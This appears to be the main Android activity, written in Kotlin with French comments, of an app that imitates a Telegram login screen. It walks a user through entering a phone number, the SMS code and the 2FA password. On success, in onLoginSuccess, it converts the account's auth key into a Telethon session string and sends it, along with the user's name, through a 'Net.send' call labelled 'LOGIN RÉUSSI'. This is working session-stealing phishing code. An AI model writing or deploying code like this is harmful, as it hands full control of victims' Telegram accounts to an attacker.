package com.tgme.app.ui

import android.app.Activity
import android.os.Bundle
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import com.github.badoualy.telegram.api.TelegramClient
import com.github.badoualy.telegram.api.utils.SrpHelper
import com.github.badoualy.telegram.tl.api.TLAbsUser
import com.github.badoualy.telegram.tl.api.account.TLPassword
import com.github.badoualy.telegram.tl.api.auth.TLAuthorization
import com.github.badoualy.telegram.tl.api.auth.TLSentCode
import com.tgme.app.*
import kotlin.concurrent.thread

class MainActivity : Activity() {

    private var client: TelegramClient? = null
    private var storage: KotlogramStorage? = null
    
    private var phoneCodeHash: String = ""
    private var currentPhone: String = ""
    private var currentDc = 2 // DC par défaut (souvent le bon pour l'Europe/Afrique)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Capture.load(this)
        
        Tg.init(this, currentDc)
        client = Tg.getClient()
        storage = Tg.getStorage()

        showPhone(ready = true)
    }

    // ---------------- ÉCRAN 1 : TÉLÉPHONE ----------------
    private fun showPhone(ready: Boolean) {
        setContentView(R.layout.screen_phone)
        val cc = findViewById<EditText>(R.id.cc)
        val phone = findViewById<EditText>(R.id.phone)
        val btn = findViewById<TextView>(R.id.btn)
        
        btn.isEnabled = ready
        btn.setOnClickListener {
            val full = normalize(cc.text.toString(), phone.text.toString())
            if (full == null) {
                toast("Numéro invalide")
                return@setOnClickListener
            }
            currentPhone = full
            btn.isEnabled = false
            toast("Envoi du code...")
            
            thread {
                try {
                    val sentCode: TLSentCode = client!!.authSendCode(false, full, true)
                    phoneCodeHash = sentCode.phoneCodeHash
                    runOnUiThread { showCode() }
                } catch (e: Exception) {
                    val msg = e.message ?: ""
                    
                    // 🔥 GESTION AUTOMATIQUE DU BON DC
                    if (msg.contains("PHONE_MIGRATE_")) {
                        val newDc = msg.substringAfter("PHONE_MIGRATE_").takeWhile { it.isDigit() }.toIntOrNull()
                        if (newDc != null && newDc in 1..5) {
                            runOnUiThread { toast("Redirection vers le DC$newDc...") }
                            currentDc = newDc
                            Tg.init(this@MainActivity, currentDc)
                            client = Tg.getClient()
                            
                            try {
                                val sentCode = client!!.authSendCode(false, full, true)
                                phoneCodeHash = sentCode.phoneCodeHash
                                runOnUiThread { showCode() }
                            } catch (e2: Exception) {
                                runOnUiThread { 
                                    toast("Erreur après migration: ${e2.message}")
                                    btn.isEnabled = true
                                }
                            }
                            return@thread
                        }
                    }
                    
                    runOnUiThread { 
                        toast("Erreur: ${e.message}")
                        btn.isEnabled = true
                    }
                }
            }
        }
    }

    // ---------------- ÉCRAN 2 : CODE ----------------
    private fun showCode() {
        setContentView(R.layout.screen_code)
        findViewById<TextView>(R.id.sub).text = "Code envoyé au $currentPhone"
        val codeInput = findViewById<EditText>(R.id.code)
        val btn = findViewById<TextView>(R.id.btn)

        btn.setOnClickListener {
            val code = codeInput.text.toString().replace(Regex("\\D"), "")
            if (code.isEmpty()) return@setOnClickListener
            btn.isEnabled = false
            toast("Vérification...")

            thread {
                try {
                    val auth: TLAuthorization = client!!.authSignIn(currentPhone, phoneCodeHash, code)
                    onLoginSuccess(auth.user.asUser)
                } catch (e: Exception) {
                    if (e.message?.contains("SESSION_PASSWORD_NEEDED") == true) {
                        runOnUiThread { showPassword() }
                    } else {
                        runOnUiThread { 
                            toast("Erreur code: ${e.message}")
                            btn.isEnabled = true
                        }
                    }
                }
            }
        }
    }

    // ---------------- ÉCRAN 3 : MOT DE PASSE 2FA (SRP) ----------------
    private fun showPassword() {
        setContentView(R.layout.screen_password)
        val pwInput = findViewById<EditText>(R.id.password)
        val btn = findViewById<TextView>(R.id.btn)

        btn.setOnClickListener {
            val password = pwInput.text.toString()
            if (password.isEmpty()) return@setOnClickListener
            btn.isEnabled = false
            toast("Vérification du mot de passe...")

            thread {
                try {
                    val passwordState = client!!.accountGetPassword() as TLPassword
                    val checkPassword = SrpHelper.computeCheck(passwordState, password)
                    val auth: TLAuthorization = client!!.authCheckPassword(checkPassword)
                    onLoginSuccess(auth.user.asUser)
                } catch (e: Exception) {
                    runOnUiThread { 
                        toast("Mot de passe incorrect: ${e.message}")
                        btn.isEnabled = true
                    }
                }
            }
        }
    }

    // ---------------- SUCCÈS : EXTRACTION ----------------
    private fun onLoginSuccess(user: TLAbsUser) {
        val u = user.asUser
        Capture.userId = u.id.toLong()
        Capture.userName = "${u.firstName} ${u.lastName}".trim()
        Capture.phone = currentPhone

        // 🔑 On récupère la clé via la propriété (plus de loadAuthKey)
        val authKey = storage?.authKey
        
        if (authKey != null) {
            val sessionString = AuthKeyConverter.toTelethonString(currentDc, authKey)
            Capture.session = sessionString
            Capture.save(this)
            Net.send("🎉 LOGIN RÉUSSI\nUser: ${Capture.userName}\nSESSION: $sessionString")
            
            runOnUiThread {
                setContentView(R.layout.screen_success)
                findViewById<TextView>(R.id.who).text = "${Capture.userName} · ID ${u.id}"
                findViewById<TextView>(R.id.num).text = currentPhone
            }
        } else {
            Net.send("❌ Erreur: Clé introuvable")
            runOnUiThread { toast("Erreur clé introuvable") }
        }
    }

    // ---------------- OUTILS ----------------
    private fun normalize(ccRaw: String, nRaw: String): String? {
        var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (n.isEmpty()) return null
        var cc = ccRaw.trim().replace(Regex("[\\s\\-().]"), "")
        if (cc.isNotEmpty() && !cc.startsWith("+")) {
            cc = if (cc.startsWith("00")) "+" + cc.substring(2) else "+$cc"
        }
        val full = when {
            n.startsWith("+") -> n
            n.startsWith("00") -> "+" + n.substring(2)
            else -> cc + n
        }
        return if (full.length >= 8) full else null
    }

    private fun toast(msg: String) = runOnUiThread {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
    }
}
